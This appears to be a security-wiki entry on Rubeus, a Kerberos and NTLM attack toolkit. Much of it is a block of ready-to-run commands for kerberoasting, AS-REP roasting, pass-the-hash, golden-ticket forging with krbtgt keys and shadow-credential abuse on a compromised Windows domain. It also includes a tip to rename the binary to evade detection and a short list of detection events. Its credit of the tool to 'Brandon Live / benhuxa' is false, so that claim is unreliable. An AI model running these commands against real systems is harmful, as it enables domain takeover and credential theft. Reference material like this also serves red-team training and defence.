---
title: Rubeus
type: entity
created: 2026-09-06
updated: 2026-09-06
tags: [tool, kerberos, ntlm, ghostpack, windows]
---

# Rubeus

**Rubeus** (GhostPack, by Brandon Live / benhuxa) is a C# Kerberos and NTLM
toolkit that runs **in-session** (no injection, minimal disk footprint) — the
default choice for Kerberos attacks on a compromised Windows host. It's the
engine behind most of the techniques in this wiki: [[pass-the-key|PtK]],
[[kerberoasting]], [[as-rep-roasting]], [[pass-the-hash-and-ticket|PtH/PtT]],
[[golden-silver-tickets]], [[s4u2self-s4u2proxy|S4U]], and
[[shadow-credentials]] (PKINIT).

## Why it's preferred

- **In-memory, in-session** — runs from the current user's context, so no
  LSASS injection / no obvious "mimikatz injecting lsass" Sysmon 10.
- **Broad Kerberos coverage** — asktgt, kerberoast, asreproast, s4u, pth,
  triage, ticket decode, nag (NTLM).
- **Ticket building** — forges TGTs (Golden/Diamond) via `asktgt` with raw
  keys + stuffed SIDs.
- **PKINIT** — `asktgt /certificate:` for [[shadow-credentials]] auth.

## Common invocations

```powershell
# Inspect current Kerberos tickets / TGTs
Rubeus.exe triage
Rubeus.exe dump /tickets            # export tickets (base64 / ccache)

# Kerberoast (all SPN accounts, RC4 for cheap cracking)
Rubeus.exe kerberoast /rc4opsec /outfile:spn.txt

# AS-REP roast (single account, RC4)
Rubeus.exe asreproast /user:svc_backup /rc4

# Pass the Key / Pass the Hash (fresh TGT from a key, inject it)
Rubeus.exe asktgt /user:svc_sql /aes256:<64-hex> /ptt
Rubeus.exe pth /user:svc_sql /NTLM:<nt-hash> /ptt

# Golden / Diamond ticket (forge a TGT from krbtgt keys + SIDs)
Rubeus.exe asktgt /user:Administrator /domain:corp.local /sid:S-1-5-21-... `
  /rc4:<krbtgt-rc4> /aes128:<krbtgt-aes128> /aes256:<krbtgt-aes256> /sids:S-1-5-21-...:512 /ptt

# S4U2Self / S4U2Proxy (constrained / RBCD)
Rubeus.exe s4u /self  /user:victim /service:cifs/attackerbox.corp.local /rc4
Rubeus.exe s4u /proxy /user:victim /service:cifs/target.corp.local /rc4

# Shadow Credentials / PKINIT (with a Whisker-planted cert)
Rubeus.exe asktgt /user:target /certificate:<base64-pfx> /password:"<pfxpass>" /getcredentials /ptt

# NTLM (nag) — request an NTLM auth to a target (coercion assist)
Rubeus.exe nag /user:attacker /domain:corp.local /dc:dc01.corp.local
```

## Detection

- **4768/4769** — the Kerberos events Rubeus drives (RC4 tells, S4U flags,
  PKINIT from a non-CA client).
- **In-memory** — little disk; the main tells are the Kerberos events and the
  injected ticket (4624 with a ticket).
- Process name `Rubeus.exe` (rename it), and the `/ptt` ticket logons.

## Links

- [[kerberos-authentication]] — the protocol it drives
- [[pass-the-key|PtK]], [[golden-silver-tickets]], [[s4u2self-s4u2proxy|S4U]] — the techniques it implements
- [[shadow-credentials]], [[whisker]] — the PKINIT pair
- [[kerberoasting]], [[as-rep-roasting]] — the roast modes
- [[mimikatz]] — the injection-based contrast

## References

- [Rubeus (GhostPack)](https://github.com/GhostPack/Rubeus)
- [Rubeus documentation](https://github.com/GhostPack/Rubeus/blob/master/Docs/README.md)
- [ired.team: Rubeus usage](https://www.ired.team/active-directory-kerberos-abuse/kerberos-attacks)
